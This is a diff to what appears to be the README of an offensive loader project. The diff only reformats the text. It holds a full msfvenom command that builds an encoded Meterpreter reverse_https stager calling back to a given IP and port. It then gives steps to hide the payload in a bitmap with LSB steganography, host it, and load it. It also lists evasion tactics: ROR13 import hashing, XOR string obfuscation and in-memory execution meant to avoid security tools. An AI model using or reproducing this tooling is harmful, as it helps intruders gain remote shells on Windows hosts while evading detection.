@@ -29,7 +29,7 @@ is done over HTTPS (SSL/TLS) to avoid network based indicators from tripping
 security tools.
 
 1. Generating the meterpreter stager:
-  msfvenom -p windows/meterpreter/reverse_https LHOST=10.248.189.74 LPORT=443 -b '\x00\xff' -e x86/shikata_ga_nai -i 3 -f raw
+  `msfvenom -p windows/meterpreter/reverse_https LHOST=10.248.189.74 LPORT=443 -b '\x00\xff' -e x86/shikata_ga_nai -i 3 -f raw`
 2. Run the stego encoder with the binary output from above and a desired bitmap
 3. Host the bitmap on some HTTP site
 4. Set the desired target URL for the bitmap in Utils.h (LSB_TARGET_URL (see HideStrings))
@@ -42,8 +42,8 @@ Note:
 Summary of Tactics implemented:
 
   1. ROR13 hashing - Manually resolving imports
-    https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
-    https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html
+    * https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
+    * https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html
   2. String Obfuscation - XOR with Offset
   3. LSB Steganography - encoding malware into benign picture file (used when downloading the meterpreter stage)
   4. In-memory execution - allocates space and launches payload directly from memory (never touch disk)
